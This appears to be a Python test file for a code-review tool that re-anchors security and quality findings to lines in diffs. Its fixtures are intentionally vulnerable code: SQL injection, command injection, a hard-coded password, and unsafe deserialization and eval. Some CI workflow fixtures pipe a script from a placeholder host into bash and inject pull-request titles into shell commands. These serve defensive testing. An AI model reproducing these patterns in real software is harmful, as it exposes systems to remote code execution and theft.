from dataclasses import replace

from reviewforge.core.state import Finding
from reviewforge.engine.finding_anchors import (
    reanchor_accessibility_findings,
    reanchor_quality_detector_duplicates,
    reanchor_security_detector_duplicates,
    unsupported_python_open_redirect_findings,
)


def _summary(file_path: str, body: str) -> str:
    lines = body.splitlines()
    patch = "\n".join(f"+{line}" for line in lines)
    return f"--- {file_path} (+{len(lines)} -0)\n@@ -0,0 +1,{len(lines)} @@\n{patch}"


def test_reanchors_react_alt_and_label_to_concrete_elements():
    file_path = "gauntlet_fullstack/seed_frontend.tsx"
    diff = _summary(
        file_path,
        """export function LoginForm() {
  return (
    <form>
      <img src="/avatar.png" />
      <input name="email" onChange={() => save()} />
    </form>
  );
}""",
    )
    findings = [
        Finding(file=file_path, line=1, category="missing-alt", message="image lacks alt"),
        Finding(file=file_path, line=2, category="missing-label", message="input lacks a label"),
    ]

    changed = reanchor_accessibility_findings(findings, diff)

    assert {finding.line for finding in changed} == {4, 5}
    assert [finding.line for finding in findings] == [4, 5]


def test_reanchors_alias_and_multiline_image_tag():
    file_path = "src/Profile.vue"
    diff = _summary(
        file_path,
        """<template>
  <img
    :src="avatar"
    class="avatar"
  />
</template>""",
    )
    finding = Finding(file=file_path, line=1, category="alt-text", message="missing alt")

    changed = reanchor_accessibility_findings([finding], diff)

    assert changed == [finding]
    assert finding.category == "missing-alt"
    assert finding.line == 2


def test_does_not_reanchor_images_with_accessible_or_uncertain_props():
    file_path = "src/Safe.tsx"
    diff = _summary(
        file_path,
        """export const Safe = () => <>
  <img src="/decorative.png" alt="" />
  <img {...imageProps} />
  <Image src="/logo.png" aria-label="Company" />
</>;""",
    )
    finding = Finding(file=file_path, line=1, category="missing-alt", message="missing alt")

    assert reanchor_accessibility_findings([finding], diff) == []
    assert finding.line == 1


def test_does_not_reanchor_controls_with_real_labels_or_dynamic_props():
    file_path = "src/SafeForm.tsx"
    diff = _summary(
        file_path,
        """export const SafeForm = () => <form>
  <label htmlFor="email">Email</label>
  <input id="email" />
  <input aria-label="Search" />
  <input {...fieldProps} />
</form>;""",
    )
    finding = Finding(file=file_path, line=1, category="missing-form-label", message="missing label")

    assert reanchor_accessibility_findings([finding], diff) == []
    assert finding.category == "missing-label"
    assert finding.line == 1


def test_does_not_guess_between_equidistant_sinks():
    file_path = "src/Gallery.tsx"
    diff = _summary(
        file_path,
        """<>
  <img src="/one.png" />
  <div />
  <img src="/two.png" />
</>""",
    )
    finding = Finding(file=file_path, line=3, category="missing-alt", message="missing alt")

    assert reanchor_accessibility_findings([finding], diff) == []
    assert finding.line == 3


def test_reanchors_duplicate_to_the_only_already_claimed_alt_sink():
    file_path = "src/Profile.vue"
    diff = _summary(
        file_path,
        """<template>
  <section>
    <img :src="avatar" />
  </section>
</template>""",
    )
    detector = Finding(
        id="detector",
        file=file_path,
        line=3,
        category="missing-alt",
        message="An added image has no accessible alternative text.",
        verified_by="detector",
    )
    reviewer = Finding(
        id="reviewer",
        file=file_path,
        line=1,
        category="missing-alt-text",
        message="The img tag is missing alt text.",
    )

    changed = reanchor_accessibility_findings([detector, reviewer], diff)

    assert changed == [reviewer]
    assert reviewer.line == 3


def test_does_not_reuse_occupied_alt_sink_without_complete_native_detector_evidence():
    file_path = "src/Profile.tsx"
    detector = Finding(
        id="detector",
        file=file_path,
        line=10,
        category="missing-alt",
        message="An image has no alternative text.",
        verified_by="detector",
    )
    reviewer = Finding(
        id="reviewer",
        file=file_path,
        line=18,
        category="missing-alt",
        message="A different image may be missing alt text.",
    )
    partial = "@@ -9,0 +10,1 @@\n+<img src={avatar} />"

    assert reanchor_accessibility_findings([detector, reviewer], partial) == []
    assert reviewer.line == 18

    component_diff = _summary(file_path, "<Image src={avatar} />")
    component_detector = replace(detector, line=1)
    component_reviewer = replace(reviewer, line=3)

    assert reanchor_accessibility_findings([component_detector, component_reviewer], component_diff) == []
    assert component_reviewer.line == 3

    mixed_case_html = _summary(
        "src/profile.html",
        """<img src="one.png">
<div></div>
<IMG src="two.png">""",
    )
    html_detector = replace(detector, file="src/profile.html", line=1)
    html_reviewer = replace(reviewer, file="src/profile.html", line=3)

    assert reanchor_accessibility_findings([html_detector, html_reviewer], mixed_case_html) == []
    assert html_reviewer.line == 3

    independent_component = _summary(
        file_path,
        """export function Profile() {
  return <>
    <img src={photo} />
    <Avatar image={teamPhoto} />
  </>
}""",
    )
    native_detector = replace(detector, line=3)
    avatar_reviewer = replace(
        reviewer,
        line=4,
        message="Avatar omits its required alt prop.",
    )

    assert reanchor_accessibility_findings([native_detector, avatar_reviewer], independent_component) == []
    assert avatar_reviewer.line == 4

    distant_diff = _summary("src/profile.html", '<img src="one.png">\n' + "\n" * 20)
    distant_detector = replace(detector, file="src/profile.html", line=1)
    distant_reviewer = replace(reviewer, file="src/profile.html", line=20)

    assert reanchor_accessibility_findings([distant_detector, distant_reviewer], distant_diff) == []
    assert distant_reviewer.line == 20


def _security_finding(
    finding_id: str,
    file_path: str,
    line: int,
    category: str,
    message: str,
    *,
    detector: bool = False,
) -> Finding:
    return Finding(
        id=finding_id,
        file=file_path,
        line=line,
        category=category,
        message=message,
        verified_by="detector" if detector else "",
    )


def test_reanchors_online_java_security_duplicates_from_unique_message_symbols():
    file_path = "eval_cases/pr1/UserController.java"
    diff = _summary(
        file_path,
        """public class UserController {
    public void deleteUser(String userId) {
        String query = "DELETE FROM users WHERE id = " + userId;
        Statement stmt = dbConnection.createStatement();
        stmt.executeUpdate(query);
    }

    private static final String DB_PASSWORD = "admin123!";

    public void runBackup(String backupPath) throws IOException {
        Runtime.getRuntime().exec("tar -czf " + backupPath);
    }
}""",
    )
    findings = [
        _security_finding("sql-det", file_path, 4, "sql-injection", "Raw JDBC Statement is used.", detector=True),
        _security_finding("secret-det", file_path, 8, "hardcoded-secrets", "Hard-coded credentials.", detector=True),
        _security_finding("command-det", file_path, 11, "command-injection", "Runtime.exec is used.", detector=True),
        _security_finding(
            "sql-llm", file_path, 2, "sql-injection", "deleteUser方法直接拼接SQL查询，userId参数未经校验。"
        ),
        _security_finding("secret-llm", file_path, 6, "hardcoded-secrets", "DB_PASSWORD硬编码在源代码中。"),
        _security_finding(
            "command-llm", file_path, 9, "command-injection", "runBackup方法直接拼接backupPath执行shell命令。"
        ),
    ]

    changed = reanchor_security_detector_duplicates(findings, diff)

    assert {(finding.id, finding.line) for finding in changed} == {
        ("sql-llm", 4),
        ("secret-llm", 8),
        ("command-llm", 11),
    }


def test_reanchors_online_python_duplicates_to_the_matching_detector_only():
    file_path = "eval_cases/pr1/data_importer.py"
    diff = _summary(
        file_path,
        """def load_state(filepath: str):
    with open(filepath, "rb") as handle:
        return pickle.loads(handle.read())


def parse_config(config_str: str):
    return yaml.load(config_str)


def run_command(user_cmd: str):
    return os.popen(user_cmd).read()""",
    )
    findings = [
        _security_finding(
            "pickle-det", file_path, 3, "insecure-deserialization", "Unsafe deserialization API.", detector=True
        ),
        _security_finding(
            "yaml-det", file_path, 7, "insecure-deserialization", "YAML load without safe loader.", detector=True
        ),
        _security_finding("command-det", file_path, 11, "command-injection", "Dynamic shell API.", detector=True),
        _security_finding(
            "pickle-llm", file_path, 1, "insecure-deserialization", "load_state使用pickle.loads反序列化不可信数据。"
        ),
        _security_finding(
            "command-llm", file_path, 9, "command-injection", "run_command直接执行user_cmd，可执行任意命令。"
        ),
    ]

    changed = reanchor_security_detector_duplicates(findings, diff)

    assert {(finding.id, finding.line) for finding in changed} == {("pickle-llm", 3), ("command-llm", 11)}
    assert next(finding for finding in findings if finding.id == "yaml-det").line == 7


def test_security_reanchor_does_not_guess_between_adjacent_independent_sinks():
    file_path = "src/jobs.py"
    diff = _summary(
        file_path,
        """def first(command):
    return os.popen(command).read()

def second(command):
    return os.popen(command).read()""",
    )
    findings = [
        _security_finding("first-det", file_path, 2, "command-injection", "Dynamic shell API.", detector=True),
        _security_finding("second-det", file_path, 5, "command-injection", "Dynamic shell API.", detector=True),
        _security_finding("llm", file_path, 3, "command-injection", "os.popen executes a dynamic command."),
    ]

    assert reanchor_security_detector_duplicates(findings, diff) == []
    assert findings[-1].line == 3


def test_security_reanchor_allows_identifier_repeated_within_one_sink_owner():
    file_path = "src/Backup.java"
    diff = _summary(
        file_path,
        """class Backup {
  void runBackup(String backupPath) throws Exception {
    validateExtension(backupPath);
    Runtime.getRuntime().exec("tar -czf " + backupPath);
  }
}""",
    )
    detector = _security_finding(
        "command-det", file_path, 4, "command-injection", "Runtime.exec receives a dynamic command.", detector=True
    )
    reviewer = _security_finding(
        "command-review", file_path, 1, "command-injection", "backupPath is concatenated into the shell command."
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert reviewer.line == 4


def test_ruby_security_reanchor_prefers_explicit_sink_api_over_shared_variables():
    file_path = "eval_cases/pr1/payment_processor.rb"
    diff = _summary(
        file_path,
        """require 'yaml'

class PaymentProcessor
  def process(user_input)
    amount = user_input[:amount].to_f

    discount = eval(user_input[:discount_code] || "0")

    final_amount = amount - discount

    `echo "Processing payment of #{final_amount}"`

    begin
      call_payment_gateway(final_amount)
    rescue Exception => e
      puts "Payment failed: #{e.message}"
    end

    config = YAML.load(File.read(user_input[:config_path]))

    system("notify.sh #{user_input[:email]} #{final_amount}")
  end
end""",
    )
    backtick_detector = _security_finding(
        "backtick-detector",
        file_path,
        11,
        "command-injection",
        "Backticks execute a command containing final_amount.",
        detector=True,
    )
    system_detector = _security_finding(
        "system-detector",
        file_path,
        21,
        "command-injection",
        "system executes a command containing user_input and final_amount.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        16,
        "command-injection",
        "user_input[:email] and final_amount are interpolated into system().",
    )

    changed = reanchor_security_detector_duplicates([backtick_detector, system_detector, reviewer], diff)

    assert changed == [reviewer]
    assert reviewer.line == 21


def test_ruby_security_reanchor_keeps_two_explicit_system_sinks_independent():
    file_path = "src/jobs.rb"
    diff = _summary(
        file_path,
        """def first(command)
  system(command)
end

def second(command)
  system(command)
end""",
    )
    findings = [
        _security_finding("first", file_path, 2, "command-injection", "system executes command.", detector=True),
        _security_finding("second", file_path, 6, "command-injection", "system executes command.", detector=True),
        _security_finding("reviewer", file_path, 4, "command-injection", "system() executes the command."),
    ]

    assert reanchor_security_detector_duplicates(findings, diff) == []
    assert findings[-1].line == 4


def test_reanchors_insecure_hash_alias_to_unique_crypto_detector():
    file_path = "src/passwords.py"
    diff = _summary(
        file_path,
        """def verify_password(password: str, expected: str) -> bool:
    digest = hashlib.md5(password.encode()).hexdigest()
    return digest == expected


def write_debug_dump(path, body):
    path.write_text(body)""",
    )
    detector = _security_finding(
        "detector", file_path, 2, "crypto", "MD5 is unsafe for password hashing.", detector=True
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        6,
        "insecure-hash",
        "verify_password uses MD5 for password hashing.",
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (2, "crypto")


def test_dangerous_function_reanchors_only_to_explicit_eval_sink():
    file_path = "src/hooks.ts"
    diff = _summary(
        file_path,
        """export function runClientHook(script: string) {
  return eval(script);
}""",
    )
    detector = _security_finding(
        "detector", file_path, 2, "code-injection", "Dynamic code execution via eval.", detector=True
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        1,
        "dangerous-function",
        "runClientHook uses eval to execute arbitrary JavaScript.",
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (2, "code-injection")


def test_dangerous_function_reanchors_explicit_function_constructor():
    file_path = "src/hooks.ts"
    diff = _summary(
        file_path,
        """export function runDynamic(body: string, value: string) {
  return new Function("value", body)(value);
}""",
    )
    detector = _security_finding(
        "detector", file_path, 2, "code-injection", "Dynamic code execution is possible.", detector=True
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        1,
        "dangerous-function",
        "runDynamic invokes the Function constructor with a dynamic body.",
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (2, "code-injection")


def test_dangerous_function_does_not_reanchor_exec_sink():
    file_path = "src/hooks.ts"
    diff = _summary(
        file_path,
        """export function spawnReport(command: string) {
  return exec(command);
}""",
    )
    detector = _security_finding(
        "detector", file_path, 2, "code-injection", "A dynamic process command is executed.", detector=True
    )
    reviewer = _security_finding("reviewer", file_path, 1, "dangerous-function", "spawnReport passes input to exec.")

    assert reanchor_security_detector_duplicates([detector, reviewer], diff) == []
    assert (reviewer.line, reviewer.category) == (1, "dangerous-function")


def test_dangerous_function_does_not_cross_reanchor_eval_and_function_sinks():
    file_path = "src/hooks.ts"
    diff = _summary(
        file_path,
        """export function runBoth(script: string) {
  const first = eval(script);
  const second = new Function(script)();
  return [first, second];
}""",
    )
    eval_detector = _security_finding(
        "eval-detector", file_path, 2, "code-injection", "Dynamic code execution via eval.", detector=True
    )
    function_reviewer = _security_finding(
        "function-reviewer",
        file_path,
        1,
        "dangerous-function",
        "runBoth invokes the Function constructor with the dynamic script.",
    )

    assert reanchor_security_detector_duplicates([eval_detector, function_reviewer], diff) == []
    assert (function_reviewer.line, function_reviewer.category) == (1, "dangerous-function")


def test_reanchors_unique_java_jdbc_concatenation_to_raw_statement_detector():
    file_path = "src/Directory.java"
    diff = _summary(
        file_path,
        """public class Directory {
    ResultSet directSearch(Connection conn, String email) throws Exception {
        Statement stmt = conn.createStatement();
        return stmt.executeQuery("SELECT * FROM users WHERE email = '" + email + "'");
    }
}""",
    )
    detector = _security_finding(
        "detector", file_path, 3, "sql-injection", "Raw JDBC Statement is used.", detector=True
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        5,
        "sql-injection",
        "使用字符串拼接构造 SQL 查询，存在 SQL 注入漏洞。",
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (3, "sql-injection")


def test_java_jdbc_fallback_keeps_two_concatenated_sinks_separate():
    file_path = "src/Directory.java"
    diff = _summary(
        file_path,
        """public class Directory {
    ResultSet byEmail(Connection conn, String email) throws Exception {
        Statement first = conn.createStatement();
        return first.executeQuery("SELECT * FROM users WHERE email = '" + email + "'");
    }

    int deleteByName(Connection conn, String name) throws Exception {
        Statement second = conn.createStatement();
        return second.executeUpdate("DELETE FROM users WHERE name = '" + name + "'");
    }
}""",
    )
    findings = [
        _security_finding("first", file_path, 3, "sql-injection", "Raw JDBC Statement is used.", detector=True),
        _security_finding("second", file_path, 8, "sql-injection", "Raw JDBC Statement is used.", detector=True),
        _security_finding(
            "reviewer", file_path, 6, "sql-injection", "SQL is constructed through string concatenation."
        ),
    ]

    assert reanchor_security_detector_duplicates(findings, diff) == []
    assert findings[-1].line == 6


def test_quality_reanchor_normalizes_unique_deterministic_multilanguage_duplicates():
    findings = [
        _security_finding(
            "catch-det",
            "src/UserController.java",
            22,
            "exception-handling",
            "The added catch block silently swallows every exception.",
            detector=True,
        ),
        _security_finding(
            "catch-review",
            "src/UserController.java",
            28,
            "empty-catch",
            "The empty catch silently swallows the database exception.",
        ),
        _security_finding(
            "jdbc-det",
            "src/Repository.java",
            19,
            "resource-leak",
            "Local JDBC Statement is not protected by try-with-resources.",
            detector=True,
        ),
        _security_finding(
            "jdbc-review",
            "src/Repository.java",
            25,
            "resource-management",
            "The Statement is not managed by try-with-resources.",
        ),
        _security_finding(
            "optional-det",
            "src/Lookup.java",
            42,
            "null-safety",
            "Optional value is dereferenced with get().",
            detector=True,
        ),
        _security_finding(
            "optional-review",
            "src/Lookup.java",
            46,
            "optional-unsafe-get",
            "Optional.get is called without checking presence.",
        ),
        _security_finding(
            "computed-det",
            "src/Profile.vue",
            21,
            "computed-side-effect",
            "A computed getter starts a fetch side effect.",
            detector=True,
        ),
        _security_finding(
            "computed-review",
            "src/Profile.vue",
            22,
            "side-effect-in-computed",
            "The computed property performs a side effect.",
        ),
        _security_finding(
            "template-det",
            "src/List.vue",
            55,
            "correctness",
            "The same element combines v-if and v-for.",
            detector=True,
        ),
        _security_finding(
            "template-review",
            "src/List.vue",
            52,
            "v-for-v-if-misuse",
            "v-for and v-if are used on the same element.",
        ),
        _security_finding(
            "timer-det",
            "src/Poll.vue",
            26,
            "resource-leak",
            "The interval has no visible clearInterval cleanup.",
            detector=True,
        ),
        _security_finding(
            "timer-review",
            "src/Poll.vue",
            32,
            "timer-leak",
            "setInterval is never cleared on unmount.",
        ),
        _security_finding(
            "goroutine-det",
            "src/service.go",
            28,
            "lifecycle",
            "A goroutine has an unbounded loop without cancellation.",
            detector=True,
        ),
        _security_finding(
            "goroutine-review",
            "src/service.go",
            25,
            "goroutine-leak",
            "The goroutine has no stop path.",
        ),
    ]

    def at_line(line: int, content: str) -> str:
        return "\n".join([*["// context"] * (line - 1), content])

    diff = "\n".join(
        [
            _summary("src/UserController.java", at_line(22, "} catch (Exception error) {}")),
            _summary("src/Repository.java", at_line(19, "Statement stmt = db.createStatement();")),
            _summary("src/Lookup.java", at_line(42, "return userId.get();")),
            _summary("src/Profile.vue", at_line(21, "fetchUser();")),
            _summary("src/List.vue", at_line(55, '<li v-for="item in items" v-if="item.active">')),
            _summary("src/Poll.vue", at_line(26, "setInterval(refresh, 1000);")),
            _summary(
                "src/service.go",
                at_line(
                    27,
                    """go func() {
  for {
    poll()
  }
}()""",
                ),
            ),
        ]
    )
    changed = reanchor_quality_detector_duplicates(findings, diff)

    assert {(finding.id, finding.line, finding.category) for finding in changed} == {
        ("catch-review", 22, "exception-handling"),
        ("jdbc-review", 19, "resource-leak"),
        ("optional-review", 42, "null-safety"),
        ("computed-review", 21, "computed-side-effect"),
        ("template-review", 55, "correctness"),
        ("timer-review", 26, "resource-leak"),
        ("goroutine-review", 28, "lifecycle"),
    }


def test_quality_reanchor_merges_go_defer_in_loop_category_drift():
    file_path = "eval_cases/pr1/user_service.go"
    diff = _summary(
        file_path,
        """package user
func load(db *sql.DB) {
  for i := 0; i < 10; i++ {
    rows, _ := db.Query("SELECT 1")
    defer rows.Close()
  }
}""",
    )

    for category in ("performance", "resource-exhaustion"):
        detector = _security_finding(
            f"detector-{category}",
            file_path,
            5,
            "resource-leak",
            "defer is registered inside a loop, so cleanup waits for the outer function.",
            detector=True,
        )
        reviewer = _security_finding(
            f"reviewer-{category}",
            file_path,
            3,
            category,
            "defer rows.Close() is inside the loop and retains every result until return.",
        )

        changed = reanchor_quality_detector_duplicates([detector, reviewer], diff)

        assert changed == [reviewer]
        assert (reviewer.line, reviewer.category) == (5, "resource-leak")


def test_quality_reanchor_scopes_computed_fetch_and_accepts_infinite_loop_alias():
    vue_file = "src/Profile.vue"
    vue_diff = _summary(
        vue_file,
        """const name = computed(() => {
  fetchUser(id)
  return user.value.name
})
watch(id, () => fetchUser(id))
async function fetchUser(id) {
  return fetch(`/users/${id}`)
}""",
    )
    computed_detector = _security_finding(
        "computed-detector",
        vue_file,
        2,
        "computed-side-effect",
        "A computed getter starts a fetch operation.",
        detector=True,
    )
    computed_reviewer = _security_finding(
        "computed-reviewer",
        vue_file,
        3,
        "side-effect-in-computed",
        "The computed property calls fetchUser and causes a side effect.",
    )

    go_file = "src/service.go"
    go_diff = _summary(
        go_file,
        """package service
func start() {
  go func() {
    for { poll() }
  }()
}""",
    )
    for detector_line in (3, 4):
        goroutine_detector = _security_finding(
            f"goroutine-detector-{detector_line}",
            go_file,
            detector_line,
            "lifecycle",
            "A goroutine performs work in an unbounded loop without cancellation.",
            detector=True,
        )
        goroutine_reviewer = _security_finding(
            f"goroutine-reviewer-{detector_line}",
            go_file,
            9,
            "infinite-loop",
            "The goroutine has an infinite loop and no exit path.",
        )
        per_run_computed = replace(computed_detector)
        per_run_reviewer = replace(computed_reviewer)

        changed = reanchor_quality_detector_duplicates(
            [per_run_computed, per_run_reviewer, goroutine_detector, goroutine_reviewer],
            "\n".join([vue_diff, go_diff]),
        )

        assert {(finding.id, finding.line, finding.category) for finding in changed} == {
            ("computed-reviewer", 2, "computed-side-effect"),
            (f"goroutine-reviewer-{detector_line}", detector_line, "lifecycle"),
        }


def test_quality_reanchor_requires_explicit_and_unique_go_defer_in_loop_sink():
    file_path = "src/queries.go"
    two_sinks = _summary(
        file_path,
        """package queries
func first(rows *sql.Rows) {
  for range items {
    defer rows.Close()
  }
}
func second(rows *sql.Rows) {
  for range moreItems {
    defer rows.Close()
  }
}""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        4,
        "resource-leak",
        "defer is registered inside a loop.",
        detector=True,
    )
    ambiguous = _security_finding(
        "ambiguous",
        file_path,
        3,
        "performance",
        "defer rows.Close() is inside the loop.",
    )

    assert reanchor_quality_detector_duplicates([detector, ambiguous], two_sinks) == []
    assert ambiguous.line == 3

    one_sink = _summary(
        file_path,
        """package queries
func first(rows *sql.Rows) {
  for range items {
    defer rows.Close()
  }
}""",
    )
    unsupported = _security_finding(
        "unsupported",
        file_path,
        3,
        "resource-exhaustion",
        "defer rows.Close() delays cleanup.",
    )

    assert reanchor_quality_detector_duplicates([detector, unsupported], one_sink) == []
    assert unsupported.line == 3


def test_quality_reanchor_does_not_guess_between_two_same_family_sinks():
    file_path = "src/Maybe.java"
    findings = [
        _security_finding(
            "first-det", file_path, 4, "null-safety", "Optional first is dereferenced with get().", detector=True
        ),
        _security_finding(
            "second-det", file_path, 14, "null-safety", "Optional second is dereferenced with get().", detector=True
        ),
        _security_finding(
            "review", file_path, 9, "optional-misuse", "Optional.get is called without a presence guard."
        ),
    ]

    assert reanchor_quality_detector_duplicates(findings, "") == []
    assert findings[-1].line == 9


def test_quality_reanchor_does_not_merge_independent_jdbc_resource_types():
    file_path = "src/Repository.java"
    findings = [
        _security_finding(
            "statement-detector",
            file_path,
            4,
            "resource-leak",
            "Local JDBC Statement resource `stmt` is not protected by try-with-resources.",
            detector=True,
        ),
        _security_finding(
            "connection-review",
            file_path,
            12,
            "resource-management",
            "The JDBC Connection `conn` is never closed.",
        ),
    ]

    diff = _summary(
        file_path,
        "\n".join(
            [
                "class Repository {",
                "  void first() throws Exception {",
                "    // context",
                "    Statement stmt = db.createStatement();",
                "  }",
                "  void second() throws Exception {",
                "    Connection conn = db.openConnection();",
                "  }",
                "}",
            ]
        ),
    )

    assert reanchor_quality_detector_duplicates(findings, diff) == []
    assert (findings[1].line, findings[1].category) == (12, "resource-management")


def test_quality_reanchor_does_not_merge_two_same_type_jdbc_resources():
    file_path = "src/Repository.java"
    findings = [
        _security_finding(
            "statement-detector",
            file_path,
            4,
            "resource-leak",
            "Local JDBC Statement resource `stmt` is not protected by try-with-resources.",
            detector=True,
        ),
        _security_finding(
            "audit-review",
            file_path,
            8,
            "resource-management",
            "The JDBC Statement `auditStmt` is never closed.",
        ),
    ]
    diff = _summary(
        file_path,
        "\n".join(
            [
                "class Repository {",
                "  void first() throws Exception {",
                "    // context",
                "    Statement stmt = db.createStatement();",
                "  }",
                "  void second() throws Exception {",
                "    // context",
                "    Statement auditStmt = db.createStatement();",
                "  }",
                "}",
            ]
        ),
    )

    assert reanchor_quality_detector_duplicates(findings, diff) == []
    assert (findings[1].line, findings[1].category) == (8, "resource-management")


def test_quality_reanchor_requires_one_concrete_sink_not_only_one_detector():
    file_path = "src/workers.go"
    findings = [
        _security_finding(
            "detector",
            file_path,
            3,
            "lifecycle",
            "A goroutine has an unbounded loop without cancellation.",
            detector=True,
        ),
        _security_finding(
            "reviewer",
            file_path,
            8,
            "goroutine-leak",
            "A second goroutine loops forever without a stop path.",
        ),
    ]
    diff = _summary(
        file_path,
        "\n".join(
            [
                "package workers",
                "func start() {",
                "  go func() { for { poll() } }()",
                "}",
                "",
                "func audit() {",
                "  // independent worker",
                "  go func() { for { flush() } }()",
                "}",
            ]
        ),
    )

    assert reanchor_quality_detector_duplicates(findings, diff) == []
    assert (findings[1].line, findings[1].category) == (8, "goroutine-leak")


def test_quality_reanchor_requires_unbounded_loop_in_complete_goroutine():
    file_path = "src/workers.go"
    diff = _summary(
        file_path,
        """package workers
func start() {
  go func() {
    pollOnce()
  }()
}""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        3,
        "lifecycle",
        "A goroutine has an unbounded loop without cancellation.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        5,
        "infinite-loop",
        "The goroutine loops forever without a stop path.",
    )

    assert reanchor_quality_detector_duplicates([detector, reviewer], diff) == []
    assert (reviewer.line, reviewer.category) == (5, "infinite-loop")


def test_reanchors_workflow_semantic_category_drift_with_unique_diff_evidence():
    file_path = ".github/workflows/gauntlet-deploy.yml"
    diff = _summary(
        file_path,
        """steps:
  - name: unsafe remote installer
    run: curl https://example.invalid/install.sh | bash
  - name: print deployment token
    run: echo ${{ secrets.DEPLOY_TOKEN }}
  - name: deploy pull request
    run: ./deploy.sh "${{ github.event.pull_request.title }}"
""",
    )
    findings = [
        _security_finding(
            "download-det", file_path, 3, "supply-chain-risk", "Remote script is piped to shell.", detector=True
        ),
        _security_finding("secret-det", file_path, 5, "data-leak", "Workflow prints a secret.", detector=True),
        _security_finding("command-det", file_path, 7, "ci-security", "PR title reaches a shell.", detector=True),
        _security_finding("download-llm", file_path, 1, "code-injection", "curl下载脚本后直接pipe到bash执行。"),
        _security_finding("secret-llm", file_path, 2, "hardcoded-secrets", "DEPLOY_TOKEN被直接打印到日志。"),
        _security_finding("command-llm", file_path, 4, "command-injection", "deploy.sh直接使用pull_request.title。"),
    ]

    changed = reanchor_security_detector_duplicates(findings, diff)

    assert {(finding.id, finding.line, finding.category) for finding in changed} == {
        ("download-llm", 3, "supply-chain-risk"),
        ("secret-llm", 5, "data-leak"),
        ("command-llm", 7, "ci-security"),
    }


def test_reanchors_generic_remote_execution_message_to_unique_workflow_pipe():
    file_path = ".github/workflows/deploy.yml"
    diff = _summary(
        file_path,
        """steps:
  - name: checkout
    uses: actions/checkout@v4
  - name: install
    run: curl https://example.invalid/install.sh | bash
""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        5,
        "supply-chain-risk",
        "Workflow executes remote script via piped shell.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        3,
        "command-injection",
        "工作流直接从远程 URL 下载并执行脚本，可能导致任意命令执行。",
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (5, "supply-chain-risk")


def test_remote_execution_fallback_does_not_absorb_distant_independent_shell_sink():
    file_path = ".github/workflows/deploy.yml"
    diff = _summary(
        file_path,
        """steps:
  - name: installer
    run: curl https://example.invalid/install.sh | bash
  - name: context
    run: echo ok
  - name: independent command
    run: bash -c "${{ github.event.issue.title }}"
""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        3,
        "supply-chain-risk",
        "Workflow executes remote script via piped shell.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        7,
        "command-injection",
        "A remote value is executed as a shell command.",
    )

    assert reanchor_security_detector_duplicates([detector, reviewer], diff) == []
    assert (reviewer.line, reviewer.category) == (7, "command-injection")


def test_remote_execution_fallback_does_not_absorb_nearby_independent_shell_sink():
    file_path = ".github/workflows/deploy.yml"
    diff = _summary(
        file_path,
        """steps:
  - name: run remote input
    run: bash -c "${{ inputs.remote_url }}"
  - name: installer
    run: curl https://example.invalid/install.sh | bash
""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        5,
        "supply-chain-risk",
        "Workflow executes remote script via piped shell.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        3,
        "command-injection",
        "Remote URL input is executed as a shell command.",
    )

    assert reanchor_security_detector_duplicates([detector, reviewer], diff) == []
    assert (reviewer.line, reviewer.category) == (3, "command-injection")


def test_remote_execution_fallback_does_not_absorb_nearby_dynamic_run_expression():
    file_path = ".github/workflows/deploy.yml"
    diff = _summary(
        file_path,
        """steps:
  - name: run remote input
    run: "${{ inputs.remote_url }}"
  - name: installer
    run: curl https://example.invalid/install.sh | bash
""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        5,
        "supply-chain-risk",
        "Workflow executes remote script via piped shell.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        3,
        "command-injection",
        "Remote URL input is executed as a shell command.",
    )

    assert reanchor_security_detector_duplicates([detector, reviewer], diff) == []
    assert (reviewer.line, reviewer.category) == (3, "command-injection")


def test_remote_detector_does_not_absorb_independent_eval_with_shared_identifier():
    file_path = ".github/workflows/deploy.yml"
    diff = _summary(
        file_path,
        """steps:
  - name: installer
    run: curl "${{ inputs.remote }}" | bash
  - name: context
    run: echo ok
  - name: independent eval
    run: ruby -e "eval('${{ inputs.remote }}')"
""",
    )
    detector = _security_finding(
        "detector",
        file_path,
        3,
        "supply-chain-risk",
        "Workflow executes a remote script via piped shell.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        7,
        "code-injection",
        "inputs.remote is passed to eval().",
    )

    assert reanchor_security_detector_duplicates([detector, reviewer], diff) == []
    assert (reviewer.line, reviewer.category) == (7, "code-injection")


def test_reanchors_normalized_security_aliases_with_exact_diff_symbols():
    cases = [
        (
            "src/config.py",
            "return yaml.load(config)",
            "insecure-deserialization",
            "unsafe-yaml",
            "yaml.load parses untrusted input.",
        ),
        (
            "src/password.py",
            "return hashlib.md5(password).hexdigest()",
            "crypto",
            "weak-hash",
            "MD5 is a weak hash for passwords.",
        ),
        (
            "src/job.rb",
            "send(name, payload)",
            "code-injection",
            "unsafe-dynamic-call",
            "send dynamically invokes a user-selected method.",
        ),
        (
            "src/reflection.rb",
            "public_send(name, payload)",
            "code-injection",
            "unsafe-reflection",
